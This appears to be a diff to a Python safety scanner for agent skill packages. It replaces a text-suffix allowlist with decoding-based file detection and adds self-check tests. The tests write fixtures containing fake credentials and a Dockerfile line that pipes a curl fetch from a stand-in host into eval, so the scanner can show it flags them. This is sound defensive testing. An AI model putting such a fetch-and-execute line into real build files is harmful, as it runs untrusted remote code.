@@ -93,7 +93,58 @@ SURFACE_KEYWORDS = {
     "commands": ("command entrypoint", "slash command", "invocation"),
     "packaging": ("bundle", "manifest", "marketplace"),
 }
+# Suffixes that make a bare string look like a filename. This is a naming
+# question, so an allowlist is the right shape: it decides whether `--evidence
+# design.md` cites a file or is prose, and over-reading prose as a path would
+# reject a legitimate citation.
 TEXT_SUFFIXES = {".md", ".py", ".js", ".mjs", ".ts", ".sh", ".json", ".yaml", ".yml", ".toml"}
+# Suffixes that are certainly not text, used to skip the obvious before paying
+# to decode. Anything not named here is decided by reading it, not by whether
+# this list anticipated it.
+BINARY_SUFFIXES = {
+    ".png",
+    ".jpg",
+    ".jpeg",
+    ".gif",
+    ".webp",
+    ".ico",
+    ".bmp",
+    ".tiff",
+    ".pdf",
+    ".zip",
+    ".gz",
+    ".bz2",
+    ".xz",
+    ".tar",
+    ".7z",
+    ".rar",
+    ".jar",
+    ".woff",
+    ".woff2",
+    ".ttf",
+    ".otf",
+    ".eot",
+    ".mp3",
+    ".mp4",
+    ".wav",
+    ".ogg",
+    ".webm",
+    ".mov",
+    ".avi",
+    ".so",
+    ".dylib",
+    ".dll",
+    ".exe",
+    ".bin",
+    ".o",
+    ".a",
+    ".class",
+    ".pyc",
+    ".wasm",
+    ".db",
+    ".sqlite",
+    ".sqlite3",
+}
 MAX_EVIDENCE = 5
 MAX_BYTES = 2_000_000
 
@@ -205,6 +256,36 @@ def phase_resource(phase):
     return SURFACE_RESOURCES.get(phase) or PHASE_RESOURCES[phase]
 
 
+def readable_lines(path):
+    """The file's lines if it is text this scan can read, otherwise None.
+
+    Scanning was keyed on an allowlist of ten suffixes, which is the wrong
+    default for a question about what a skill ships: a `.ps1`, `.php`, `.rb`,
+    `.bats`, `.sql`, `.env`, or `.ini` file was not partially scanned but
+    entirely unscanned, and a credential or an interpolated shell call in one
+    was invisible to the phase that exists to find it. Being an unanticipated
+    suffix should never be what exempts a file from a safety scan.
+
+    Membership is decided by decoding instead. A NUL byte is the same signal
+    git uses to call a blob binary, and it costs one bounded read rather than a
+    list that has to keep up with every language a skill might ship.
+    """
+    if path.suffix.lower() in BINARY_SUFFIXES:
+        return None
+    try:
+        if path.stat().st_size > MAX_BYTES:
+            return None
+        raw = path.read_bytes()
+    except OSError:
+        return None
+    if b"\0" in raw:
+        return None
+    try:
+        return raw.decode("utf-8").splitlines()
+    except UnicodeDecodeError:
+        return None
+
+
 def detect_surfaces(skill_root):
     """Collect bounded file evidence for each surface the skill may expose."""
     evidence = {name: [] for name in SURFACES}
@@ -212,13 +293,10 @@ def detect_surfaces(skill_root):
         relative = path.relative_to(skill_root)
         if not path.is_file() or excluded(relative.parts):
             continue
-        if path.suffix.lower() not in TEXT_SUFFIXES or path.stat().st_size > MAX_BYTES:
+        lines = readable_lines(path)
+        if lines is None:
             continue
         stem = path.stem.lower()
-        try:
-            lines = path.read_text(errors="replace").splitlines()
-        except OSError:
-            continue
         for name in SURFACES:
             hits = evidence[name]
             if len(hits) >= MAX_EVIDENCE:
@@ -484,11 +562,8 @@ def safety_findings(skill_root):
         relative = path.relative_to(skill_root)
         if not path.is_file() or excluded(relative.parts):
             continue
-        if path.suffix.lower() not in TEXT_SUFFIXES or path.stat().st_size > MAX_BYTES:
-            continue
-        try:
-            lines = path.read_text(errors="replace").splitlines()
-        except OSError:
+        lines = readable_lines(path)
+        if lines is None:
             continue
         for number, line in enumerate(lines, 1):
             # A commented line is a description of code, not code. Reporting
@@ -594,12 +669,10 @@ def unreachable_findings(skill_root):
         relative = path.relative_to(skill_root)
         if not path.is_file() or excluded(relative.parts):
             continue
-        if path.suffix.lower() not in TEXT_SUFFIXES or path.stat().st_size > MAX_BYTES:
+        lines = readable_lines(path)
+        if lines is None:
             continue
-        try:
-            text = path.read_text(errors="replace")
-        except OSError:
-            continue
+        text = "\n".join(lines)
         for key, target in resources.items():
             if target != path and target.name in text:
                 named.add(key)
@@ -1253,6 +1326,24 @@ def command_self_check(_args):
         (language / "run.py").write_text("\n".join(safe) + "\n")
         (language / "run.js").write_text("execFile('git', ['checkout', branch])\n")
         assert safety_findings(language) == [], safety_findings(language)
+
+        # Membership in the scan was an allowlist of ten suffixes, so a skill
+        # shipping any other language was not partially scanned but entirely
+        # unscanned, and the phase reported clean. A file is text if it decodes
+        # as text, which is the question that was actually being asked.
+        for name, body in (
+            ("deploy.ps1", '$k = "api_key=AbCdEf0123456789xyz"'),
+            ("hook.php", '$token = "secret=AbCdEf0123456789xyz";'),
+            ("Dockerfile", 'RUN eval "$(curl -s http://x.invalid/i.sh)"'),
+        ):
+            (language / name).write_text(body + "\n")
+            assert safety_findings(language), f"{name} was skipped for having an unlisted suffix"
+            (language / name).unlink()
+        # A binary is skipped rather than decoded into accidental matches, and
+        # must not crash the scan that now reads every other file.
+        (language / "logo.png").write_bytes(bytes(range(256)) * 40)
+        assert safety_findings(language) == [], "a binary file produced findings"
+        (language / "logo.png").unlink()
 
         # A reference nothing names is unreachable: an agent following the
         # skill can never load it. Reviewers miss this because it is an
